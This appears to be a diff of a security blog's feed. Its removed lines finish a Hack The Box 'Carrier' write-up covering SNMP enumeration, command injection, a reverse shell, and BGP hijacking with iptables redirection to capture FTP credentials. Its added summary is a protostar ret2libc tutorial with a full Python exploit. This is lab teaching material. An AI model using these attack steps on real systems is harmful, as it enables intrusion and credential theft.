-&lt;h4 id=&quot;-c-for-community-string---v-for-version&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-c&lt;/code&gt; for community string , &lt;code class=&quot;highlighter-rouge&quot;&gt;-v&lt;/code&gt; for version&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-only-get-one-result-string-snnet_45jdx23-so-is-that-the-serial-number--lets-check&quot;&gt;We only get one result &lt;code class=&quot;highlighter-rouge&quot;&gt;STRING: &quot;SN#NET_45JDX23&quot;&lt;/code&gt; so is that the serial number ? Let’s check&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;admin : NET_45JDX23&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/carrier/11.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/carrier/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-it-worked&quot;&gt;And it worked.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;exploiting-rce-and-getting-user&quot;&gt;Exploiting RCE and getting user&lt;/h3&gt;
-&lt;h4 id=&quot;dashboard--tickets-and-diagnostics-are-available-but-monitoring-is-disabled-tickets-are-not-important-now-but-we-will-need-them-later&quot;&gt;Dashboard , Tickets and Diagnostics are available. But Monitoring is disabled. Tickets are not important now but we will need them later.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/13.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/carrier/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;diagnostics-has-a-button-saying-verify-status-&quot;&gt;Diagnostics has a button saying &lt;code class=&quot;highlighter-rouge&quot;&gt;verify status&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;after-clicking-&quot;&gt;After clicking :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;by-looking-at-the-source-we-find-a-hidden-field-called-check--also-if-we-used-burp-to-intercept-the-requests-we-will-find-it-the-value-of-check-is-base64-encoded-string-of-quagga-&quot;&gt;By looking at the source we find a hidden field called &lt;code class=&quot;highlighter-rouge&quot;&gt;check&lt;/code&gt; , also if we used burp to intercept the requests we will find it. The value of check is base64 encoded string of “quagga” :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/17.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/carrier/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-can-try-to-encode-root-and-see-what-happens-&quot;&gt;We can try to encode “root” and see what happens :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;it-gives-us-a-different-output-&quot;&gt;It gives us a different output :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-can-confirm-that-we-have-remote-code-execution-by-trying-something-like-quagga--whoami--id&quot;&gt;We can confirm that we have remote code execution by trying something like “quagga &amp;amp;&amp;amp; whoami &amp;amp;&amp;amp; id”&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/21.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/carrier/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-we-see-root--we-can-easily-encode-our-reverse-shell-payload-and-get-a-reverse-shell-&quot;&gt;And we see root , we can easily encode our reverse shell payload and get a reverse shell :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/23.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/carrier/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;but-did-we-really-get-root-access--ifconfig-and-we-see-that-we-are-not-on-the-actual-host-which-is-101010105--we-are-on-a-different-one&quot;&gt;But did we really get root access ? &lt;code class=&quot;highlighter-rouge&quot;&gt;ifconfig&lt;/code&gt; and we see that we are not on the actual host which is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.105&lt;/code&gt; , we are on a different one.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/25.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/carrier/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;anyway-we-owned-the-user-flag-&quot;&gt;Anyway we owned the user flag !&lt;/h4&gt;
-&lt;h4 id=&quot;i-also-wrote-a-python-script-to-automate-the-process-of-getting-a-reverse-shell--ill-post-it-later-update--here-is-the-script&quot;&gt;I also wrote a python script to automate the process of getting a reverse shell , I’ll post it later. (Update : Here is the &lt;a href=&quot;https://github.com/0xRick/CTF-scripts/blob/master/Hack%20The%20Box/carrier/reverse_shell.py&quot;&gt;script&lt;/a&gt;)&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;bgp-hijacking-and-getting-root&quot;&gt;Bgp Hijacking and getting root&lt;/h3&gt;
-&lt;h4 id=&quot;we-saw-quagga-mentioned-in-the-diagnostics-page--but-what-is-quagga-&quot;&gt;We saw “quagga” mentioned in the diagnostics page , but what is quagga ?&lt;/h4&gt;
-&lt;h4 id=&quot;basically-quagga-is-a-routing-software-and-since-quagga-is-installed-on-this-host-then-most-likely-we-are-going-to-perform-bgp-hijacking-or-route-hijacking-i-wont-go-through-a-detailed-explanation-about-this-attack-because-that-will-be-off-topic--i-will-include-some-resources-in-simple-words-we-are-going-to-hijack-another-network-prefixes-and-announce-them-to-us--so-if-anybody-tried-to-connect-to-that-network-they-will-connect-to-us-this-is-possible-because-we-are-on-the-host-that-is-responsible-for-routing&quot;&gt;Basically quagga is a routing software and since quagga is installed on this host then most likely we are going to perform bgp-hijacking or route-hijacking. I won’t go through a detailed explanation about this attack because that will be off-topic , I will include some resources. In simple words we are going to hijack another network prefixes and announce them to us , so if anybody tried to connect to that network they will connect to us. This is possible because we are on the host that is responsible for routing.&lt;/h4&gt;
-&lt;h4 id=&quot;read-about-quagga&quot;&gt;Read about &lt;a href=&quot;https://en.wikipedia.org/wiki/Quagga_(software)&quot;&gt;quagga&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;bgp-hijacking-wikipedia&quot;&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/BGP_hijacking&quot;&gt;Bgp Hijacking&lt;/a&gt; (wikipedia)&lt;/h4&gt;
-&lt;h4 id=&quot;bgp-hijacking-internetsocietyorg&quot;&gt;&lt;a href=&quot;https://www.internetsociety.org/blog/2018/05/what-is-bgp-hijacking-anyway/&quot;&gt;Bgp Hijacking&lt;/a&gt; (internetsociety.org)&lt;/h4&gt;
-&lt;h4 id=&quot;bgp-hijacking-demo&quot;&gt;&lt;a href=&quot;https://github.com/mininet/mininet/wiki/BGP-Path-Hijacking-Attack-Demo&quot;&gt;Bgp Hijacking demo&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;bgp-hijacking-blogsakamaicom&quot;&gt;&lt;a href=&quot;https://blogs.akamai.com/2018/11/bgp-route-hijacking.html&quot;&gt;Bgp Hijacking&lt;/a&gt; (blogs.akamai.com)&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;if-we-take-a-look-at-the-tickets-again--ticket-number-6-&quot;&gt;If we take a look at the tickets again , ticket number 6 :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-will-notice-this-line--one-of-their-vip-is-having-issues-connecting-by-ftp-to-an-important-server-in-the-1012015024-network--so-on-10120150-theres-an-ftp-server-and-someone-is-accessing-it-regularly--on-github-theres-a-python-script-called-fake_ftp-which-creates-an-ftp-server-that-steals-credentials-we-can-try-it-locally-with-testtest&quot;&gt;We will notice this line : “one of their VIP is having issues connecting by FTP to an important server in the 10.120.15.0/24 network” , so on 10.120.15.0 there’s an FTP server and someone is accessing it regularly , on github there’s a python script called &lt;a href=&quot;https://gist.github.com/neoplacer/6504e34a35a6df323b9c4a80da1a1180/c00a2a817fb1a1aaba3231bde7bb879312af2d51&quot;&gt;fake_ftp&lt;/a&gt; which creates an FTP server that steals credentials. We can try it locally with &lt;code class=&quot;highlighter-rouge&quot;&gt;test:test&lt;/code&gt;:&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/27.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/carrier/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;now-everything-is-ready--we-just-need-to-hijack-10120150-then-run-that-fake-ftp-on-the-host-and-we-will-be-able-to-steal-credentials--but-the-script-is-written-in-python-27-and-this-host-has-only-python-3-installed-&quot;&gt;Now everything is ready , we just need to hijack 10.120.15.0 then run that fake ftp on the host and we will be able to steal credentials , but the script is written in python 2.7 and this host has only python 3 installed :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-can-fake-an-ftp-server-with-nc-or-edit-the-script-to-work-with-python3--but-we-will-do-something-different--we-will-edit-iptables-rules-to-route-traffic-from-port-21-on-the-host-to-port-21-on-our-box--so-what-will-finally-happen-is-&quot;&gt;We can fake an FTP server with &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; or edit the script to work with python3 , but we will do something different , we will edit &lt;code class=&quot;highlighter-rouge&quot;&gt;iptables&lt;/code&gt; rules to route traffic from port 21 on the host to port 21 on our box , so what will finally happen is :&lt;/h4&gt;
-&lt;h4 id=&quot;someone-tries-to-connect-to-the-ftp-server--connects-to-the-router-instead-of-the-server--iptables-routes-that-traffic-to-our-box--our-fake-ftp-server-steals-the-credentials&quot;&gt;Someone tries to connect to the ftp server –&amp;gt; connects to the router instead of the server –&amp;gt; iptables routes that traffic to our box –&amp;gt; our fake ftp server steals the credentials&lt;/h4&gt;
-&lt;h4 id=&quot;in-order-to-perform-our-attack-we-will-edit-bgpdconf-in-etcquagga&quot;&gt;in order to perform our attack we will edit &lt;code class=&quot;highlighter-rouge&quot;&gt;bgpd.conf&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/quagga&lt;/code&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;original-&quot;&gt;Original :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;after-edits-&quot;&gt;After edits :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;the-only-difference-is-this-line-network-1012015025&quot;&gt;The only difference is this line &lt;code class=&quot;highlighter-rouge&quot;&gt;network 10.120.15.0/25&lt;/code&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;now-we-will-run-a-python-simple-http-server-to-host-the-new-bgpdconf-&quot;&gt;Now we will run a python simple http server to host the new bgpd.conf :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;pythom -m SimpleHTTPServer 80&lt;/code&gt;&lt;/p&gt;
-&lt;h4 id=&quot;then-we-will-delete-the-old-one--download-the-new-conf-edit-iptables-rules-and-finally-restart-the-service-&quot;&gt;Then we will delete the old one , download the new conf, edit iptables rules and finally restart the service :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;iptables-commands-&quot;&gt;iptables commands :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;iptables -t nat -A PREROUTING -p tcp --dport 21 -j DNAT --to-destination 10.10.xx.xx:21&lt;/code&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;iptables -t nat -A POSTROUTING -j MASQUERADE&lt;/code&gt;&lt;/p&gt;
-&lt;h4 id=&quot;then-we-will-wait-for-someone-to-access-the-fake-ftp-server&quot;&gt;Then we will wait for someone to access the fake ftp server&lt;/h4&gt;
-&lt;h4 id=&quot;watch-cat-logtxt-this-will-do-cat-logtxt-and-refresh-it-every-2-seconds-logtxt-is-where-the-captured-credentials-are-stored-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;watch cat log.txt&lt;/code&gt; this will do &lt;code class=&quot;highlighter-rouge&quot;&gt;cat log.txt&lt;/code&gt; and refresh it every 2 seconds (log.txt is where the captured credentials are stored) :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;finally-we-get-these-credentials-&quot;&gt;Finally we get these credentials :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;root:BGPtelc0rout1ng&lt;/code&gt;&lt;/p&gt;
-&lt;h4 id=&quot;now-we-can-ssh-to-the-actual-box-as-root-&quot;&gt;Now we can ssh to the actual box as root :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
-&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---ethereal&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/ethereal/&quot;&gt;Hack The Box - Ethereal&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---frolic&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/frolic/&quot;&gt;Hack The Box - Frolic&lt;/a&gt;&lt;/h4&gt;
-&lt;hr /&gt;</content><author><name></name></author><summary type="html">Quick Summary Hey guys today Carrier retired and here is my write-up about it. User on this box wasn’t hard to get , but for root it’s a different thing because we will go through some networking tricks and we will perform an attack called bgp hijacking. The overall experience was great and carrier was one of the best boxes on this platfrom. It’s a linux box and its ip is 10.10.10.105 I added it to /etc/hosts as carrier.htb. Let’s jump right in ! Nmap As always we will start by using nmap to scan for open ports and services. nmap -sV -sT -sC carrier.htb We get ftp on port 21 , ssh on port 22 and http on port 80. Some other boxes had anonymous ftp access allowed but here it’s not allowed , also the port is filtered so we are not going to check ftp. HTTP Initial Enumeration On http there’s a web application called Lyghtspeed and we are asked to login. Under “Please login” we see that it’s saying Error 45007 and Error 45009 which is interesting. Next thing to check is sub directories enumeration : gobuster -u http://carrier.htb/ -w /usr/share/wordlists/dirb/common.txt -t 100 -to 200s ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://carrier.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 3m20s ===================================================== 2019/03/15 11:50:56 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /css (Status: 301) /debug (Status: 301) /doc (Status: 301) /fonts (Status: 301) /img (Status: 301) /index.php (Status: 200) /js (Status: 301) /server-status (Status: 403) /tools (Status: 301) We will only check interesting ones : /tools : It has a php file called remote.php and by checking it : It says “License expired, exiting…” /debug : It’s just phpinfo page /doc : There’s a pdf file and an image , the pdf file is called error_codes.pdf so it might be helpful because we saw earlier two errors on the login page. Error 45007 is “License invalid or expired” Error 45009 is “System credentials have not been set. Default admin user password is set (see chassis serial number)” So now we know that we need that serial number to be able to login , but how to get it ? More nmap At this point we may think that there are other services running on the box and we have missed them. So before running a full tcp scan we will scan udp first. nmap -sU carrier.htb We get dhcps on port 67 and snmp on port 161. Let’s check snmp. Snmp Enumeration Snmp stands for Simple Network Management Protocols and it’s an Internet Standard protocol for collecting and organizing information about managed devices on IP networks and for modifying that information to change device behavior. you can read more about it here We will use a tool called snmpwalk , it’s an important tool in snmp enumeration and can tell us a lot of useful information. Read about snmpwalk here snmpwalk -c public -v 1 carrier.htb -c for community string , -v for version We only get one result STRING: &quot;SN#NET_45JDX23&quot; so is that the serial number ? Let’s check admin : NET_45JDX23 And it worked. Exploiting RCE and getting user Dashboard , Tickets and Diagnostics are available. But Monitoring is disabled. Tickets are not important now but we will need them later. Diagnostics has a button saying verify status : After clicking : By looking at the source we find a hidden field called check , also if we used burp to intercept the requests we will find it. The value of check is base64 encoded string of “quagga” : We can try to encode “root” and see what happens : It gives us a different output : We can confirm that we have remote code execution by trying something like “quagga &amp;amp;&amp;amp; whoami &amp;amp;&amp;amp; id” And we see root , we can easily encode our reverse shell payload and get a reverse shell : But did we really get root access ? ifconfig and we see that we are not on the actual host which is 10.10.10.105 , we are on a different one. Anyway we owned the user flag ! I also wrote a python script to automate the process of getting a reverse shell , I’ll post it later. (Update : Here is the script) Bgp Hijacking and getting root We saw “quagga” mentioned in the diagnostics page , but what is quagga ? Basically quagga is a routing software and since quagga is installed on this host then most likely we are going to perform bgp-hijacking or route-hijacking. I won’t go through a detailed explanation about this attack because that will be off-topic , I will include some resources. In simple words we are going to hijack another network prefixes and announce them to us , so if anybody tried to connect to that network they will connect to us. This is possible because we are on the host that is responsible for routing. Read about quagga Bgp Hijacking (wikipedia) Bgp Hijacking (internetsociety.org) Bgp Hijacking demo Bgp Hijacking (blogs.akamai.com) If we take a look at the tickets again , ticket number 6 : We will notice this line : “one of their VIP is having issues connecting by FTP to an important server in the 10.120.15.0/24 network” , so on 10.120.15.0 there’s an FTP server and someone is accessing it regularly , on github there’s a python script called fake_ftp which creates an FTP server that steals credentials. We can try it locally with test:test: Now everything is ready , we just need to hijack 10.120.15.0 then run that fake ftp on the host and we will be able to steal credentials , but the script is written in python 2.7 and this host has only python 3 installed : We can fake an FTP server with nc or edit the script to work with python3 , but we will do something different , we will edit iptables rules to route traffic from port 21 on the host to port 21 on our box , so what will finally happen is : Someone tries to connect to the ftp server –&amp;gt; connects to the router instead of the server –&amp;gt; iptables routes that traffic to our box –&amp;gt; our fake ftp server steals the credentials in order to perform our attack we will edit bgpd.conf in /etc/quagga Original : After edits : The only difference is this line network 10.120.15.0/25 Now we will run a python simple http server to host the new bgpd.conf : pythom -m SimpleHTTPServer 80 Then we will delete the old one , download the new conf, edit iptables rules and finally restart the service : iptables commands : iptables -t nat -A PREROUTING -p tcp --dport 21 -j DNAT --to-destination 10.10.xx.xx:21 iptables -t nat -A POSTROUTING -j MASQUERADE Then we will wait for someone to access the fake ftp server watch cat log.txt this will do cat log.txt and refresh it every 2 seconds (log.txt is where the captured credentials are stored) : Finally we get these credentials : root:BGPtelc0rout1ng Now we can ssh to the actual box as root : And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Ethereal Next Hack The Box write-up : Hack The Box - Frolic</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/carrier/0.png" /></entry></feed>
+&lt;hr /&gt;</content><author><name></name></author><summary type="html">Introduction Hey guys , In the last post about buffer overflow we exploited a buffer overflow vulnerability where we were able to inject a shellcode and escalate privileges to root. But that was possible because we were able to overwrite the return address to another address on the stack where we placed our shellcode , but what if the stack is non-executable ? we will perform an attack called ret2libc and that’s what we are going to discuss today with protostar - stack6. Without wasting more time let’s jump right in ! Read the previous posts if you haven’t yet. ./stack6 As always we are given the source code of the binary : #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;string.h&amp;gt; void getpath() { char buffer[64]; unsigned int ret; printf(&quot;input path please: &quot;); fflush(stdout); gets(buffer); ret = __builtin_return_address(0); if((ret &amp;amp; 0xbf000000) == 0xbf000000) { printf(&quot;bzzzt (%p)\n&quot;, ret); _exit(1); } printf(&quot;got path %s\n&quot;, buffer); } int main(int argc, char **argv) { getpath(); } What this code is doing is just printing input path please: then it stores our input in a buffer of 64 chars and finally it prints it out: Our problem is this if statement : if((ret &amp;amp; 0xbf000000) == 0xbf000000) { printf(&quot;bzzzt (%p)\n&quot;, ret); _exit(1); } This is making sure that the return address is not on the stack , which makes it not possible to perform a shellcode injection like we did in the previous example. We can defeat this by a technique called ret2libc. ret2libc So what is “ret2libc” ? If we take the word itself : “ret” is return , “2” means to and “libc” is the C library. The idea behind ret2libc is instead of injecting shellcode and jumping to the address that holds that shellcode we can use the functions that are already in the C library. For example we can call the function system() and make it execute /bin/sh. (Read about system() here). We will also need to use the function exit() to make the program exit cleanly. (Read about exit() here). So finally our attack payload will be : “padding –&amp;gt; address of system() –&amp;gt; address of exit() –&amp;gt; /bin/sh” instead of : “padding –&amp;gt; new return address –&amp;gt; NOP –&amp;gt; shellcode”. Now let’s see how will we do it. Exploiation Again , this will execute /bin/sh as root because this binary is an suid binary. If it wasn’t suid we would get a shell as the same user. We can check by using find : find /opt/protostar/bin/ -perm -4000 | grep stack6 As you can see stack6 is an suid binary. So first of all , after we call system() we will need to give it /bin/sh , how will we do that ? A nice way to do it is to store /bin/sh in an environment variable. I created a variable and called it SHELL : Now we need to find the address of that variable , we can do it from gdb by setting a breakpoint at main , then running the program and doing this : x/s *((char **)environ+x) where x is a number , This will print the address of an environment variable. We will keep trying numbers until we get the address of SHELL But I found a better way to do it when I was reading an article on shellblade. We will use a c program to tell us the estimated address. Code : #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; int main(int argc, char **argv) { char *ptr = getenv(&quot;SHELL&quot;); if (ptr != NULL) { printf(&quot;Estimated address: %p\n&quot;, ptr); return 0; } } Then we will compile it : gcc address.c -o address : As you can see it’s telling us the address of the environment variable SHELL. Now keep in mind that this is not the “exact” address and we will need to go up and down to get the right address. Let’s start by finding the offset. As we did before we will use pattern_create.rb and pattern_offset.rb from metasploit exploitation tools. ./pattern_create.rb -l 100 We have our pattern now let’s run the program in gdb and set a breakpoint before main break *main. Then we will type c to continue and paste the pattern. The buffer will overflow and we will see exactly where did the overflow happen : We got the address 0x37634136 , now let’s go back and use pattern_offset.rb : ./pattern_offset.rb -q 0x37634136 So after 80 chars the buffer overflows. Next thing to check is the addresses of system() and exit(). From gdb we will set a break point at main and type r to run the program. After it reaches the break point and breaks we can get the address of system by typing p system and we will do the same thing for exit p exit : Address of system : 0xb7ecffb0 Address of exit : 0xb7ec60c0 Lastly we will check the address of SHELL again because it’s subject to change : Address : 0xbffff985 Let’s check our notes : Ok , we are ready to write our exploit , we will use struct import struct like we did before. We will create a variable for the chars we will use to fill the buffer and call it buffer , its value will be 80 A’s. buffer = &quot;A&quot; * 80 Then we will create 3 variables to hold the addresses of system() , exit() and SHELL. We will use struct to reverse the addresses. system = struct.pack(&quot;I&quot; ,0xb7ecffb0) exit = struct.pack(&quot;I&quot; ,0xb7ec60c0) shell = struct.pack(&quot;I&quot; ,0xbffff985) And finally we will print the payload. print buffer + system + exit + shell Final script : import struct buffer = &quot;A&quot; * 80 system = struct.pack(&quot;I&quot; ,0xb7ecffb0) exit = struct.pack(&quot;I&quot; ,0xb7ec60c0) shell = struct.pack(&quot;I&quot; ,0xbffff985) print buffer + system + exit + shell We have to remember that the address of SHELL is not the exact address and we will need to go up or down for a little bit. We will execute the script and redirect the output to a file and name it payload. python /tmp/stack6.py &amp;gt; /tmp/payload , Then we will cat the file and pipe the output to ./stack6 : And no shell , After going up and down by editing the address in the python script I finally got the right address which is 0xbffff992 : python /tmp/stack6.py &amp;gt; /tmp/payload cat /tmp/payload - | ./stack6 root shell! So after editing the address of shell variable , the script will be like this : import struct buffer = &quot;A&quot; * 80 system = struct.pack(&quot;I&quot; ,0xb7ecffb0) exit = struct.pack(&quot;I&quot; ,0xb7ec60c0) shell = struct.pack(&quot;I&quot; ,0xbffff992) print buffer + system + exit + shell That’s it , Feedback is appreciated ! Don’t forget to read the previous articles , Tweet about the article if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Buffer Overflow article : Buffer Overflow Practical Examples , Shellcode Injection and Local Privilege Escalation - protostar stack5</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/binary-exploitation/BOF6/0.png" /></entry></feed>
